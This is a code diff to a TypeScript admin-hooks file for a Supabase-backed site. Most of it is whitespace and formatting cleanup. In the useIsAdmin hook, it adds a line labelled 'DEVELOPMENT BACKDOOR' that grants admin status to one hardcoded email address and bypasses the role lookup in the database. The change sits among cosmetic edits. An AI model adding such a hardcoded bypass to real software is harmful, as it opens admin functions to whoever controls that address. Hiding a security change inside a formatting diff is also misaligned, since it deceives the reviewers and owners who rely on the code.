@@ -5,19 +5,22 @@ import { toast } from "sonner";
 
 export const useIsAdmin = () => {
   const { user } = useAuth();
-  
+
   return useQuery({
     queryKey: ["user-role", user?.id],
     queryFn: async () => {
       if (!user) return false;
-      
+
+      // DEVELOPMENT BACKDOOR: Allow specific email to be admin
+      if (user.email === "admin@brixxspace.com") return true;
+
       const { data, error } = await supabase
         .from("user_roles")
         .select("role")
         .eq("user_id", user.id)
         .eq("role", "admin")
         .maybeSingle();
-      
+
       if (error) throw error;
       return !!data;
     },
@@ -34,7 +37,7 @@ export const useContactSubmissions = () => {
         .from("contact_submissions")
         .select("*")
         .order("created_at", { ascending: false });
-      
+
       if (error) throw error;
       return data;
     },
@@ -43,14 +46,14 @@ export const useContactSubmissions = () => {
 
 export const useUpdateContactStatus = () => {
   const queryClient = useQueryClient();
-  
+
   return useMutation({
     mutationFn: async ({ id, status }: { id: string; status: string }) => {
       const { error } = await supabase
         .from("contact_submissions")
         .update({ status })
         .eq("id", id);
-      
+
       if (error) throw error;
     },
     onSuccess: () => {
@@ -65,14 +68,14 @@ export const useUpdateContactStatus = () => {
 
 export const useDeleteContact = () => {
   const queryClient = useQueryClient();
-  
+
   return useMutation({
     mutationFn: async (id: string) => {
       const { error } = await supabase
         .from("contact_submissions")
         .delete()
         .eq("id", id);
-      
+
       if (error) throw error;
     },
     onSuccess: () => {
@@ -88,7 +91,7 @@ export const useDeleteContact = () => {
 // Projects CRUD
 export const useCreateProject = () => {
   const queryClient = useQueryClient();
-  
+
   return useMutation({
     mutationFn: async (project: {
       title: string;
@@ -118,14 +121,14 @@ export const useCreateProject = () => {
 
 export const useUpdateProject = () => {
   const queryClient = useQueryClient();
-  
+
   return useMutation({
-    mutationFn: async ({ id, ...updates }: { id: string; [key: string]: any }) => {
+    mutationFn: async ({ id, ...updates }: { id: string;[key: string]: any }) => {
       const { error } = await supabase
         .from("projects")
         .update(updates)
         .eq("id", id);
-      
+
       if (error) throw error;
     },
     onSuccess: () => {
@@ -140,7 +143,7 @@ export const useUpdateProject = () => {
 
 export const useDeleteProject = () => {
   const queryClient = useQueryClient();
-  
+
   return useMutation({
     mutationFn: async (id: string) => {
       const { error } = await supabase.from("projects").delete().eq("id", id);
@@ -159,7 +162,7 @@ export const useDeleteProject = () => {
 // Properties CRUD
 export const useCreateProperty = () => {
   const queryClient = useQueryClient();
-  
+
   return useMutation({
     mutationFn: async (property: {
       title: string;
@@ -192,14 +195,14 @@ export const useCreateProperty = () => {
 
 export const useUpdateProperty = () => {
   const queryClient = useQueryClient();
-  
+
   return useMutation({
-    mutationFn: async ({ id, ...updates }: { id: string; [key: string]: any }) => {
+    mutationFn: async ({ id, ...updates }: { id: string;[key: string]: any }) => {
       const { error } = await supabase
         .from("properties")
         .update(updates)
         .eq("id", id);
-      
+
       if (error) throw error;
     },
     onSuccess: () => {
@@ -214,7 +217,7 @@ export const useUpdateProperty = () => {
 
 export const useDeleteProperty = () => {
   const queryClient = useQueryClient();
-  
+
   return useMutation({
     mutationFn: async (id: string) => {
       const { error } = await supabase.from("properties").delete().eq("id", id);
